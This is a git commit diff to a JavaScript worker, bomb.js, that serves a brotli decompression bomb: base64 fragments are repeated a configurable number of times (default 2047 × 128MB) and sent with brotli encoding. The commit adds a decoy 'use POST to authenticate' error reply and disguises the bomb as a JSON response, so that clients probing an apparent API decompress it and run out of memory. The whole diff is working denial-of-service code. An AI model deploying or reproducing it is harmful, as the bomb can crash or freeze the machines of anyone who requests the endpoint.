16b4cda4b64446748dd1dd3246eeb4ac3ae68539
Sunset Mikoto <26019675+SunsetMkt@users.noreply.github.com>
2025-12-15 15:55:52 +0800

    feat: u

--- worker/bomb.js
+++ worker/bomb.js
@@ -1,8 +1,8 @@
 const brotliBombParts = {
-    Header: "z///f/gnAOKxQCD3/p/////wTwDEYQGA7v0/////4Z8AiMMiAN37f/7//8M/ARCHBQC69//8//",
+    Header: "z///f/gnAOKxQCD3/p/////wTwDEYQGA7v0/////4Z8AiMMiAN37f/7//8M/ARCHBQC69//8//==",
     Seq128MB:
         "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/z///f/gnAOKwAED3/p/////wTwDEYQGA7v0/////4Z8AiMMCAN37f/7//8M/ARCHBQC69//8//",
-    Footer: "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/Pw==",
+    Footer: "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/Pw",
 };
 
 function base64ToUint8Array(base64) {
@@ -20,6 +20,7 @@ const partsBin = {
     seq: base64ToUint8Array(brotliBombParts.Seq128MB),
     footer: base64ToUint8Array(brotliBombParts.Footer),
 };
+const DEFAULT_COUNT = 2047;
 
 function getBrotliBombBuffer(count) {
     const totalLength =
@@ -45,6 +46,28 @@ function getBrotliBombBuffer(count) {
 }
 
 export default async function handleRequest(request) {
+    const url = new URL(request.url);
+    const params = url.searchParams;
+
+    const debug = params.get("debug") === "true";
+    const count = parseInt(params.get("count")) || DEFAULT_COUNT;
+
+    if (request.method !== "POST" && !debug) {
+        return new Response(
+            JSON.stringify({
+                error: "Method Not Allowed",
+                message: "Please use POST to authenticate or retrieve data.",
+            }),
+            {
+                status: 405,
+                headers: {
+                    "Content-Type": "application/json",
+                    Allow: "POST",
+                },
+            },
+        );
+    }
+
     const acceptEncoding = request.headers.get("Accept-Encoding");
 
     if (
@@ -54,14 +77,16 @@ export default async function handleRequest(request) {
         return new Response("Require Accept-Encoding: br", { status: 406 });
     }
 
-    const brotliBomb = getBrotliBombBuffer(2047);
+    const brotliBomb = getBrotliBombBuffer(count);
 
     return new Response(brotliBomb, {
         encodeBody: "manual",
         headers: {
             "Content-Encoding": "br",
             "Content-Length": brotliBomb.byteLength.toString(),
-            "Content-Type": "text/html; charset=utf-8",
+            "Content-Type": debug
+                ? "text/html; charset=utf-8"
+                : "application/json",
             "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
         },
     });
